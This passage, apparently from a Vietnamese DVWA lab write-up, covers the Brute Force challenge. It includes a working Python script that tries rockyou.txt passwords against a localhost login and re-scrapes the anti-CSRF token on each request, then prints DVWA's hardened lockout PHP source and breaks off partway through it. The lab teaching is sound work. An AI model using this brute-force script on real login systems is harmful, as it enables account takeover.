<a id=__codelineno-4-19 name=__codelineno-4-19 href=#__codelineno-4-19></a>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;Giá trị của thẻ có name=&quot;user_token_value&quot; là: </span><span class=si>{</span><span class=n>user_token_value</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
<a id=__codelineno-4-20 name=__codelineno-4-20 href=#__codelineno-4-20></a>    <span class=k>else</span><span class=p>:</span>
<a id=__codelineno-4-21 name=__codelineno-4-21 href=#__codelineno-4-21></a>        <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Không tìm thấy thẻ có name=&quot;user_token_value&quot; trên trang web.&#39;</span><span class=p>)</span>
<a id=__codelineno-4-22 name=__codelineno-4-22 href=#__codelineno-4-22></a><span class=k>else</span><span class=p>:</span>
<a id=__codelineno-4-23 name=__codelineno-4-23 href=#__codelineno-4-23></a>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Không thể truy cập trang web.&#39;</span><span class=p>)</span>
</code></pre></div> <p>Kết hợp đoạn code trên và đoạn code ở challenge Low. Ta được code hoàn chỉnh (lưu ý ở challenge này có thời gian login fail được random từ 0 tới 3s).</p> <div class=highlight><span class=filename>high.py</span><pre><span></span><code><a id=__codelineno-5-1 name=__codelineno-5-1 href=#__codelineno-5-1></a><span class=kn>import</span> <span class=nn>requests</span>
<a id=__codelineno-5-2 name=__codelineno-5-2 href=#__codelineno-5-2></a><span class=kn>import</span> <span class=nn>re</span>
<a id=__codelineno-5-3 name=__codelineno-5-3 href=#__codelineno-5-3></a>
<a id=__codelineno-5-4 name=__codelineno-5-4 href=#__codelineno-5-4></a><span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;http://localhost:4280/vulnerabilities/brute/&#39;</span>
<a id=__codelineno-5-5 name=__codelineno-5-5 href=#__codelineno-5-5></a><span class=n>params_base</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;username&#39;</span><span class=p>:</span> <span class=s1>&#39;admin&#39;</span><span class=p>,</span> <span class=s1>&#39;Login&#39;</span><span class=p>:</span> <span class=s1>&#39;Login&#39;</span><span class=p>,</span> <span class=s1>&#39;user_token&#39;</span><span class=p>:</span> <span class=n>csrf_token</span><span class=p>}</span>
<a id=__codelineno-5-6 name=__codelineno-5-6 href=#__codelineno-5-6></a>
<a id=__codelineno-5-7 name=__codelineno-5-7 href=#__codelineno-5-7></a><span class=n>headers</span> <span class=o>=</span> <span class=p>{</span>
<a id=__codelineno-5-8 name=__codelineno-5-8 href=#__codelineno-5-8></a>    <span class=s1>&#39;sec-ch-ua&#39;</span><span class=p>:</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
<a id=__codelineno-5-9 name=__codelineno-5-9 href=#__codelineno-5-9></a>    <span class=s1>&#39;sec-ch-ua-mobile&#39;</span><span class=p>:</span> <span class=s1>&#39;?0&#39;</span><span class=p>,</span>
<a id=__codelineno-5-10 name=__codelineno-5-10 href=#__codelineno-5-10></a>    <span class=s1>&#39;sec-ch-ua-platform&#39;</span><span class=p>:</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
<a id=__codelineno-5-11 name=__codelineno-5-11 href=#__codelineno-5-11></a>    <span class=s1>&#39;Upgrade-Insecure-Requests&#39;</span><span class=p>:</span> <span class=s1>&#39;1&#39;</span><span class=p>,</span>
<a id=__codelineno-5-12 name=__codelineno-5-12 href=#__codelineno-5-12></a>    <span class=s1>&#39;User-Agent&#39;</span><span class=p>:</span> <span class=s1>&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36&#39;</span><span class=p>,</span>
<a id=__codelineno-5-13 name=__codelineno-5-13 href=#__codelineno-5-13></a>    <span class=s1>&#39;Accept&#39;</span><span class=p>:</span> <span class=s1>&#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#39;</span><span class=p>,</span>
<a id=__codelineno-5-14 name=__codelineno-5-14 href=#__codelineno-5-14></a>    <span class=s1>&#39;Sec-Fetch-Site&#39;</span><span class=p>:</span> <span class=s1>&#39;same-origin&#39;</span><span class=p>,</span>
<a id=__codelineno-5-15 name=__codelineno-5-15 href=#__codelineno-5-15></a>    <span class=s1>&#39;Sec-Fetch-Mode&#39;</span><span class=p>:</span> <span class=s1>&#39;navigate&#39;</span><span class=p>,</span>
<a id=__codelineno-5-16 name=__codelineno-5-16 href=#__codelineno-5-16></a>    <span class=s1>&#39;Sec-Fetch-User&#39;</span><span class=p>:</span> <span class=s1>&#39;?1&#39;</span><span class=p>,</span>
<a id=__codelineno-5-17 name=__codelineno-5-17 href=#__codelineno-5-17></a>    <span class=s1>&#39;Sec-Fetch-Dest&#39;</span><span class=p>:</span> <span class=s1>&#39;document&#39;</span><span class=p>,</span>
<a id=__codelineno-5-18 name=__codelineno-5-18 href=#__codelineno-5-18></a>    <span class=s1>&#39;Referer&#39;</span><span class=p>:</span> <span class=s1>&#39;http://localhost:4280/vulnerabilities/brute/&#39;</span><span class=p>,</span>
<a id=__codelineno-5-19 name=__codelineno-5-19 href=#__codelineno-5-19></a>    <span class=s1>&#39;Accept-Encoding&#39;</span><span class=p>:</span> <span class=s1>&#39;gzip, deflate&#39;</span><span class=p>,</span>
<a id=__codelineno-5-20 name=__codelineno-5-20 href=#__codelineno-5-20></a>    <span class=s1>&#39;Accept-Language&#39;</span><span class=p>:</span> <span class=s1>&#39;en-US,en;q=0.9&#39;</span><span class=p>,</span>
<a id=__codelineno-5-21 name=__codelineno-5-21 href=#__codelineno-5-21></a>    <span class=s1>&#39;Cookie&#39;</span><span class=p>:</span> <span class=s1>&#39;PHPSESSID=cc82ec3baf0f4a4eb0e7513fd7bc084a; security=low&#39;</span>
<a id=__codelineno-5-22 name=__codelineno-5-22 href=#__codelineno-5-22></a><span class=p>}</span>
<a id=__codelineno-5-23 name=__codelineno-5-23 href=#__codelineno-5-23></a>
<a id=__codelineno-5-24 name=__codelineno-5-24 href=#__codelineno-5-24></a><span class=c1># Đọc danh sách mật khẩu từ tệp pass.txt</span>
<a id=__codelineno-5-25 name=__codelineno-5-25 href=#__codelineno-5-25></a><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;rockyou.txt&#39;</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>password_file</span><span class=p>:</span>
<a id=__codelineno-5-26 name=__codelineno-5-26 href=#__codelineno-5-26></a>    <span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=n>password_file</span><span class=p>:</span>
<a id=__codelineno-5-27 name=__codelineno-5-27 href=#__codelineno-5-27></a>        <span class=c1># Loại bỏ ký tự xuống dòng từ mật khẩu</span>
<a id=__codelineno-5-28 name=__codelineno-5-28 href=#__codelineno-5-28></a>        <span class=n>password</span> <span class=o>=</span> <span class=n>line</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
<a id=__codelineno-5-29 name=__codelineno-5-29 href=#__codelineno-5-29></a>        <span class=c1># Thêm mật khẩu vào params_base</span>
<a id=__codelineno-5-30 name=__codelineno-5-30 href=#__codelineno-5-30></a>
<a id=__codelineno-5-31 name=__codelineno-5-31 href=#__codelineno-5-31></a>
<a id=__codelineno-5-32 name=__codelineno-5-32 href=#__codelineno-5-32></a>        <span class=n>params</span> <span class=o>=</span> <span class=n>params_base</span><span class=o>.</span><span class=n>copy</span><span class=p>()</span>
<a id=__codelineno-5-33 name=__codelineno-5-33 href=#__codelineno-5-33></a>        <span class=n>params</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>password</span>
<a id=__codelineno-5-34 name=__codelineno-5-34 href=#__codelineno-5-34></a>
<a id=__codelineno-5-35 name=__codelineno-5-35 href=#__codelineno-5-35></a>        <span class=c1># Gửi yêu cầu GET với mật khẩu khác nhau</span>
<a id=__codelineno-5-36 name=__codelineno-5-36 href=#__codelineno-5-36></a>        <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=n>params</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
<a id=__codelineno-5-37 name=__codelineno-5-37 href=#__codelineno-5-37></a>
<a id=__codelineno-5-38 name=__codelineno-5-38 href=#__codelineno-5-38></a>        <span class=k>if</span> <span class=n>response</span><span class=o>.</span><span class=n>status_code</span> <span class=o>!=</span> <span class=mi>200</span><span class=p>:</span>
<a id=__codelineno-5-39 name=__codelineno-5-39 href=#__codelineno-5-39></a>            <span class=n>pattern</span> <span class=o>=</span> <span class=sa>r</span><span class=s1>&#39;&lt;input.*?type=[&quot;</span><span class=se>\&#39;</span><span class=s1>]hidden[&quot;</span><span class=se>\&#39;</span><span class=s1>].*?name=[&quot;</span><span class=se>\&#39;</span><span class=s1>]user_token[&quot;</span><span class=se>\&#39;</span><span class=s1>].*?value=[&quot;</span><span class=se>\&#39;</span><span class=s1>](.*?)[&quot;</span><span class=se>\&#39;</span><span class=s1>].*?&gt;&#39;</span>
<a id=__codelineno-5-40 name=__codelineno-5-40 href=#__codelineno-5-40></a>            <span class=n>match</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>pattern</span><span class=p>,</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
<a id=__codelineno-5-41 name=__codelineno-5-41 href=#__codelineno-5-41></a>            <span class=n>user_token</span> <span class=o>=</span> <span class=n>match</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
<a id=__codelineno-5-42 name=__codelineno-5-42 href=#__codelineno-5-42></a>            <span class=n>params</span><span class=p>[</span><span class=s1>&#39;user_token&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>user_token</span>
<a id=__codelineno-5-43 name=__codelineno-5-43 href=#__codelineno-5-43></a>
<a id=__codelineno-5-44 name=__codelineno-5-44 href=#__codelineno-5-44></a>    <span class=c1># Kiểm tra và xử lý phản hồi ở đây</span>
<a id=__codelineno-5-45 name=__codelineno-5-45 href=#__codelineno-5-45></a>    <span class=c1># Ví dụ: nếu có dấu hiệu mật khẩu đúng, bạn có thể in ra và dừng vòng lặp</span>
<a id=__codelineno-5-46 name=__codelineno-5-46 href=#__codelineno-5-46></a>        <span class=k>if</span> <span class=s2>&quot;Username and/or password incorrect.&quot;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
<a id=__codelineno-5-47 name=__codelineno-5-47 href=#__codelineno-5-47></a>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&quot;Đã tìm thấy mật khẩu đúng: </span><span class=si>{</span><span class=n>password</span><span class=si>}</span><span class=s2>&quot;</span><span class=p>)</span>
<a id=__codelineno-5-48 name=__codelineno-5-48 href=#__codelineno-5-48></a>            <span class=k>break</span>
</code></pre></div> <p>Bên cạnh việc dùng thư viện <code>re</code> để tìm phần tử trong website, ta có thể dùng <code>BeautifulSoup</code> thay thế.</p> <p>Về cơ bản, bước đầu của việc test pass là đặt 1 csrf_token <code>giả</code> để gửi request tới website. Sau đó chắc chắn rằng csrf_token lúc này sẽ bị thay đổi sau lần request đầu tiên. Lúc này ta sẽ dò website để lấy csrf_token và đưa nó vào biến user_token. Từ request thứ 2 trở đi, mọi chuyện sẽ đơn giản hơn nhiều.</p> <hr> <h2 id=security-level-impossible><strong>Security Level: Impossible</strong><a class=headerlink href=#security-level-impossible title="Permanent link">&para;</a></h2> <p>Source code</p> <div class=highlight><span class=filename>vulnerabilities/brute/source/impossible.php</span><pre><span></span><code><a id=__codelineno-6-1 name=__codelineno-6-1 href=#__codelineno-6-1></a><span class=cp>&lt;?php</span>
<a id=__codelineno-6-2 name=__codelineno-6-2 href=#__codelineno-6-2></a>
<a id=__codelineno-6-3 name=__codelineno-6-3 href=#__codelineno-6-3></a><span class=k>if</span><span class=p>(</span> <span class=nb>isset</span><span class=p>(</span> <span class=nv>$_POST</span><span class=p>[</span> <span class=s1>&#39;Login&#39;</span> <span class=p>]</span> <span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nb>isset</span> <span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nb>isset</span> <span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>])</span> <span class=p>)</span> <span class=p>{</span>
<a id=__codelineno-6-4 name=__codelineno-6-4 href=#__codelineno-6-4></a>    <span class=c1>// Check Anti-CSRF token</span>
<a id=__codelineno-6-5 name=__codelineno-6-5 href=#__codelineno-6-5></a>    <span class=nx>checkToken</span><span class=p>(</span> <span class=nv>$_REQUEST</span><span class=p>[</span> <span class=s1>&#39;user_token&#39;</span> <span class=p>],</span> <span class=nv>$_SESSION</span><span class=p>[</span> <span class=s1>&#39;session_token&#39;</span> <span class=p>],</span> <span class=s1>&#39;index.php&#39;</span> <span class=p>);</span>
<a id=__codelineno-6-6 name=__codelineno-6-6 href=#__codelineno-6-6></a>
<a id=__codelineno-6-7 name=__codelineno-6-7 href=#__codelineno-6-7></a>    <span class=c1>// Sanitise username input</span>
<a id=__codelineno-6-8 name=__codelineno-6-8 href=#__codelineno-6-8></a>    <span class=nv>$user</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span> <span class=s1>&#39;username&#39;</span> <span class=p>];</span>
<a id=__codelineno-6-9 name=__codelineno-6-9 href=#__codelineno-6-9></a>    <span class=nv>$user</span> <span class=o>=</span> <span class=nb>stripslashes</span><span class=p>(</span> <span class=nv>$user</span> <span class=p>);</span>
<a id=__codelineno-6-10 name=__codelineno-6-10 href=#__codelineno-6-10></a>    <span class=nv>$user</span> <span class=o>=</span> <span class=p>((</span><span class=nb>isset</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&quot;___mysqli_ston&quot;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nb>is_object</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&quot;___mysqli_ston&quot;</span><span class=p>]))</span> <span class=o>?</span> <span class=nx>mysqli_real_escape_string</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&quot;___mysqli_ston&quot;</span><span class=p>],</span>  <span class=nv>$user</span> <span class=p>)</span> <span class=o>:</span> <span class=p>((</span><span class=nb>trigger_error</span><span class=p>(</span><span class=s2>&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span><span class=p>,</span> <span class=nx>E_USER_ERROR</span><span class=p>))</span> <span class=o>?</span> <span class=s2>&quot;&quot;</span> <span class=o>:</span> <span class=s2>&quot;&quot;</span><span class=p>));</span>
<a id=__codelineno-6-11 name=__codelineno-6-11 href=#__codelineno-6-11></a>
<a id=__codelineno-6-12 name=__codelineno-6-12 href=#__codelineno-6-12></a>    <span class=c1>// Sanitise password input</span>
<a id=__codelineno-6-13 name=__codelineno-6-13 href=#__codelineno-6-13></a>    <span class=nv>$pass</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span> <span class=s1>&#39;password&#39;</span> <span class=p>];</span>
<a id=__codelineno-6-14 name=__codelineno-6-14 href=#__codelineno-6-14></a>    <span class=nv>$pass</span> <span class=o>=</span> <span class=nb>stripslashes</span><span class=p>(</span> <span class=nv>$pass</span> <span class=p>);</span>
<a id=__codelineno-6-15 name=__codelineno-6-15 href=#__codelineno-6-15></a>    <span class=nv>$pass</span> <span class=o>=</span> <span class=p>((</span><span class=nb>isset</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&quot;___mysqli_ston&quot;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nb>is_object</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&quot;___mysqli_ston&quot;</span><span class=p>]))</span> <span class=o>?</span> <span class=nx>mysqli_real_escape_string</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&quot;___mysqli_ston&quot;</span><span class=p>],</span>  <span class=nv>$pass</span> <span class=p>)</span> <span class=o>:</span> <span class=p>((</span><span class=nb>trigger_error</span><span class=p>(</span><span class=s2>&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span><span class=p>,</span> <span class=nx>E_USER_ERROR</span><span class=p>))</span> <span class=o>?</span> <span class=s2>&quot;&quot;</span> <span class=o>:</span> <span class=s2>&quot;&quot;</span><span class=p>));</span>
<a id=__codelineno-6-16 name=__codelineno-6-16 href=#__codelineno-6-16></a>    <span class=nv>$pass</span> <span class=o>=</span> <span class=nb>md5</span><span class=p>(</span> <span class=nv>$pass</span> <span class=p>);</span>
<a id=__codelineno-6-17 name=__codelineno-6-17 href=#__codelineno-6-17></a>
<a id=__codelineno-6-18 name=__codelineno-6-18 href=#__codelineno-6-18></a>    <span class=c1>// Default values</span>
<a id=__codelineno-6-19 name=__codelineno-6-19 href=#__codelineno-6-19></a>    <span class=nv>$total_failed_login</span> <span class=o>=</span> <span class=mi>3</span><span class=p>;</span>
<a id=__codelineno-6-20 name=__codelineno-6-20 href=#__codelineno-6-20></a>    <span class=nv>$lockout_time</span>       <span class=o>=</span> <span class=mi>15</span><span class=p>;</span>
<a id=__codelineno-6-21 name=__codelineno-6-21 href=#__codelineno-6-21></a>    <span class=nv>$account_locked</span>     <span class=o>=</span> <span class=k>false</span><span class=p>;</span>
<a id=__codelineno-6-22 name=__codelineno-6-22 href=#__codelineno-6-22></a>
<a id=__codelineno-6-23 name=__codelineno-6-23 href=#__codelineno-6-23></a>    <span class=c1>// Check the database (Check user information)</span>
<a id=__codelineno-6-24 name=__codelineno-6-24 href=#__codelineno-6-24></a>    <span class=nv>$data</span> <span class=o>=</span> <span class=nv>$db</span><span class=o>-&gt;</span><span class=na>prepare</span><span class=p>(</span> <span class=s1>&#39;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#39;</span> <span class=p>);</span>
<a id=__codelineno-6-25 name=__codelineno-6-25 href=#__codelineno-6-25></a>    <span class=nv>$data</span><span class=o>-&gt;</span><span class=na>bindParam</span><span class=p>(</span> <span class=s1>&#39;:user&#39;</span><span class=p>,</span> <span class=nv>$user</span><span class=p>,</span> <span class=nx>PDO</span><span class=o>::</span><span class=na>PARAM_STR</span> <span class=p>);</span>
<a id=__codelineno-6-26 name=__codelineno-6-26 href=#__codelineno-6-26></a>    <span class=nv>$data</span><span class=o>-&gt;</span><span class=na>execute</span><span class=p>();</span>
<a id=__codelineno-6-27 name=__codelineno-6-27 href=#__codelineno-6-27></a>    <span class=nv>$row</span> <span class=o>=</span> <span class=nv>$data</span><span class=o>-&gt;</span><span class=na>fetch</span><span class=p>();</span>
<a id=__codelineno-6-28 name=__codelineno-6-28 href=#__codelineno-6-28></a>
<a id=__codelineno-6-29 name=__codelineno-6-29 href=#__codelineno-6-29></a>    <span class=c1>// Check to see if the user has been locked out.</span>
<a id=__codelineno-6-30 name=__codelineno-6-30 href=#__codelineno-6-30></a>    <span class=k>if</span><span class=p>(</span> <span class=p>(</span> <span class=nv>$data</span><span class=o>-&gt;</span><span class=na>rowCount</span><span class=p>()</span> <span class=o>==</span> <span class=mi>1</span> <span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span> <span class=nv>$row</span><span class=p>[</span> <span class=s1>&#39;failed_login&#39;</span> <span class=p>]</span> <span class=o>&gt;=</span> <span class=nv>$total_failed_login</span> <span class=p>)</span> <span class=p>)</span>  <span class=p>{</span>
<a id=__codelineno-6-31 name=__codelineno-6-31 href=#__codelineno-6-31></a>        <span class=c1>// User locked out.  Note, using this method would allow for user enumeration!</span>
<a id=__codelineno-6-32 name=__codelineno-6-32 href=#__codelineno-6-32></a>        <span class=c1>//echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;</span>
<a id=__codelineno-6-33 name=__codelineno-6-33 href=#__codelineno-6-33></a>
<a id=__codelineno-6-34 name=__codelineno-6-34 href=#__codelineno-6-34></a>        <span class=c1>// Calculate when the user would be allowed to login again</span>
<a id=__codelineno-6-35 name=__codelineno-6-35 href=#__codelineno-6-35></a>        <span class=nv>$last_login</span> <span class=o>=</span> <span class=nb>strtotime</span><span class=p>(</span> <span class=nv>$row</span><span class=p>[</span> <span class=s1>&#39;last_login&#39;</span> <span class=p>]</span> <span class=p>);</span>
<a id=__codelineno-6-36 name=__codelineno-6-36 href=#__codelineno-6-36></a>        <span class=nv>$timeout</span>    <span class=o>=</span> <span class=nv>$last_login</span> <span class=o>+</span> <span class=p>(</span><span class=nv>$lockout_time</span> <span class=o>*</span> <span class=mi>60</span><span class=p>);</span>
<a id=__codelineno-6-37 name=__codelineno-6-37 href=#__codelineno-6-37></a>        <span class=nv>$timenow</span>    <span class=o>=</span> <span class=nb>time</span><span class=p>();</span>
<a id=__codelineno-6-38 name=__codelineno-6-38 href=#__codelineno-6-38></a>
<a id=__codelineno-6-39 name=__codelineno-6-39 href=#__codelineno-6-39></a>        <span class=cm>/*</span>
<a id=__codelineno-6-40 name=__codelineno-6-40 href=#__codelineno-6-40></a><span class=cm>        print &quot;The last login was: &quot; . date (&quot;h:i:s&quot;, $last_login) . &quot;&lt;br /&gt;&quot;;</span>
<a id=__codelineno-6-41 name=__codelineno-6-41 href=#__codelineno-6-41></a><span class=cm>        print &quot;The timenow is: &quot; . date (&quot;h:i:s&quot;, $timenow) . &quot;&lt;br /&gt;&quot;;</span>
<a id=__codelineno-6-42 name=__codelineno-6-42 href=#__codelineno-6-42></a><span class=cm>        print &quot;The timeout is: &quot; . date (&quot;h:i:s&quot;, $timeout) . &quot;&lt;br /&gt;&quot;;</span>
<a id=__codelineno-6-43 name=__codelineno-6-43 href=#__codelineno-6-43></a><span class=cm>        */</span>
<a id=__codelineno-6-44 name=__codelineno-6-44 href=#__codelineno-6-44></a>
<a id=__codelineno-6-45 name=__codelineno-6-45 href=#__codelineno-6-45></a>        <span class=c1>// Check to see if enough time has passed, if it hasn&#39;t locked the account</span>
<a id=__codelineno-6-46 name=__codelineno-6-46 href=#__codelineno-6-46></a>        <span class=k>if</span><span class=p>(</span> <span class=nv>$timenow</span> <span class=o>&lt;</span> <span class=nv>$timeout</span> <span class=p>)</span> <span class=p>{</span>
<a id=__codelineno-6-47 name=__codelineno-6-47 href=#__codelineno-6-47></a>            <span class=nv>$account_locked</span> <span class=o>=</span> <span class=k>true</span><span class=p>;</span>
<a id=__codelineno-6-48 name=__codelineno-6-48 href=#__codelineno-6-48></a>            <span class=c1>// print &quot;The account is locked&lt;br /&gt;&quot;;</span>
<a id=__codelineno-6-49 name=__codelineno-6-49 href=#__codelineno-6-49></a>        <span class=p>}</span>
<a id=__codelineno-6-50 name=__codelineno-6-50 href=#__codelineno-6-50></a>    <span class=p>}</span>
<a id=__codelineno-6-51 name=__codelineno-6-51 href=#__codelineno-6-51></a>
<a id=__codelineno-6-52 name=__codelineno-6-52 href=#__codelineno-6-52></a>    <span class=c1>// Check the database (if username matches the password)</span>
<a id=__codelineno-6-53 name=__codelineno-6-53 href=#__codelineno-6-53></a>    <span class=nv>$data</span> <span class=o>=</span> <span class=nv>$db</span><span class=o>-&gt;</span><span class=na>prepare</span><span class=p>(</span> <span class=s1>&#39;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39;</span> <span class=p>);</span>
<a id=__codelineno-6-54 name=__codelineno-6-54 href=#__codelineno-6-54></a>    <span class=nv>$data</span><span class=o>-&gt;</span><span class=na>bindParam</span><span class=p>(</span> <span class=s1>&#39;:user&#39;</span><span class=p>,</span> <span class=nv>$user</span><span class=p>,</span> <span class=nx>PDO</span><span class=o>::</span><span class=na>PARAM_STR</span><span class=p>);</span>
<a id=__codelineno-6-55 name=__codelineno-6-55 href=#__codelineno-6-55></a>    <span class=nv>$data</span><span class=o>-&gt;</span><span class=na>bindParam</span><span class=p>(</span> <span class=s1>&#39;:password&#39;</span><span class=p>,</span> <span class=nv>$pass</span><span class=p>,</span> <span class=nx>PDO</span><span class=o>::</span><span class=na>PARAM_STR</span> <span class=p>);</span>
<a id=__codelineno-6-56 name=__codelineno-6-56 href=#__codelineno-6-56></a>    <span class=nv>$data</span><span class=o>-&gt;</span><span class=na>execute</span><span class=p>();</span>
<a id=__codelineno-6-57 name=__codelineno-6-57 href=#__codelineno-6-57></a>    <span class=nv>$row</span> <span class=o>=</span> <span class=nv>$data</span><span class=o>-&gt;</span><span class=na>fetch</span><span class=p>();</span>
<a id=__codelineno-6-58 name=__codelineno-6-58 href=#__codelineno-6-58></a>
<a id=__codelineno-6-59 name=__codelineno-6-59 href=#__codelineno-6-59></a>    <span class=c1>// If its a valid login...</span>
<a id=__codelineno-6-60 name=__codelineno-6-60 href=#__codelineno-6-60></a>    <span class=k>if</span><span class=p>(</span> <span class=p>(</span> <span class=nv>$data</span><span class=o>-&gt;</span><span class=na>rowCount</span><span class=p>()</span> <span class=o>==</span> <span class=mi>1</span> <span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span> <span class=nv>$account_locked</span> <span class=o>==</span> <span class=k>false</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>
<a id=__codelineno-6-61 name=__codelineno-6-61 href=#__codelineno-6-61></a>        <span class=c1>// Get users details</span>
<a id=__codelineno-6-62 name=__codelineno-6-62 href=#__codelineno-6-62></a>        <span class=nv>$avatar</span>       <span class=o>=</span> <span class=nv>$row</span><span class=p>[</span> <span class=s1>&#39;avatar&#39;</span> <span class=p>];</span>
<a id=__codelineno-6-63 name=__codelineno-6-63 href=#__codelineno-6-63></a>        <span class=nv>$failed_login</span> <span class=o>=</span> <span class=nv>$row</span><span class=p>[</span> <span class=s1>&#39;failed_login&#39;</span> <span class=p>];</span>
<a id=__codelineno-6-64 name=__codelineno-6-64 href=#__codelineno-6-64></a>        <span class=nv>$last_login</span>   <span class=o>=</span> <span class=nv>$row</span><span class=p>[</span> <span class=s1>&#39;last_login&#39;</span> <span class=p>];</span>
<a id=__codelineno-6-65 name=__codelineno-6-65 href=#__codelineno-6-65></a>
<a id=__codelineno-6-66 name=__codelineno-6-66 href=#__codelineno-6-66></a>        <span class=c1>// Login successful</span>
<a id=__codelineno-6-67 name=__codelineno-6-67 href=#__codelineno-6-67></a>        <span class=k>echo</span> <span class=s2>&quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;</span><span class=si>{</span><span class=nv>$user</span><span class=si>}</span><span class=s2>&lt;/em&gt;&lt;/p&gt;&quot;</span><span class=p>;</span>
<a id=__codelineno-6-68 name=__codelineno-6-68 href=#__codelineno-6-68></a>        <span class=k>echo</span> <span class=s2>&quot;&lt;img src=</span><span class=se>\&quot;</span><span class=si>{</span><span class=nv>$avatar</span><span class=si>}</span><span class=se>\&quot;</span><span class=s2> /&gt;&quot;</span><span class=p>;</span>
<a id=__codelineno-6-69 name=__codelineno-6-69 href=#__codelineno-6-69></a>
<a id=__codelineno-6-70 name=__codelineno-6-70 href=#__codelineno-6-70></a>        <span class=c1>// Had the account been locked out since last login?</span>
<a id=__codelineno-6-71 name=__codelineno-6-71 href=#__codelineno-6-71></a>        <span class=k>if</span><span class=p>(</span> <span class=nv>$failed_login</span> <span class=o>&gt;=</span> <span class=nv>$total_failed_login</span> <span class=p>)</span> <span class=p>{</span>
<a id=__codelineno-6-72 name=__codelineno-6-72 href=#__codelineno-6-72></a>            <span class=k>echo</span> <span class=s2>&quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;</span><span class=p>;</span>
<a id=__codelineno-6-73 name=__codelineno-6-73 href=#__codelineno-6-73></a>            <span class=k>echo</span> <span class=s2>&quot;&lt;p&gt;Number of login attempts: &lt;em&gt;</span><span class=si>{</span><span class=nv>$failed_login</span><span class=si>}</span><span class=s2>&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;</span><span class=si>{</span><span class=nv>$last_login</span><span class=si>}</span><span class=s2>&lt;/em&gt;.&lt;/p&gt;&quot;</span><span class=p>;</span>
<a id=__codelineno-6-74 name=__codelineno-6-74 href=#__codelineno-6-74></a>        <span class=p>}</span>
<a id=__codelineno-6-75 name=__codelineno-6-75 href=#__codelineno-6-75></a>
<a id=__codelineno-6-76 name=__codelineno-6-76 href=#__codelineno-6-76></a>        <span class=c1>// Reset bad login count</span>
<a id=__codelineno-6-77 name=__codelineno-6-77 href=#__codelineno-6-77></a>        <span class=nv>$data</span> <span class=o>=</span> <span class=nv>$db</span><span class=o>-&gt;</span><span class=na>prepare</span><span class=p>(</span> <span class=s1>&#39;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#39;</span> <span class=p>);</span>
<a id=__codelineno-6-78 name=__codelineno-6-78 href=#__codelineno-6-78></a>        <span class=nv>$data</span><span class=o>-&gt;</span><span class=na>bindParam</span><span class=p>(</span> <span class=s1>&#39;:user&#39;</span><span class=p>,</span> <span class=nv>$user</span><span class=p>,</span> <span class=nx>PDO</span><span class=o>::</span><span class=na>PARAM_STR</span> <span class=p>);</span>
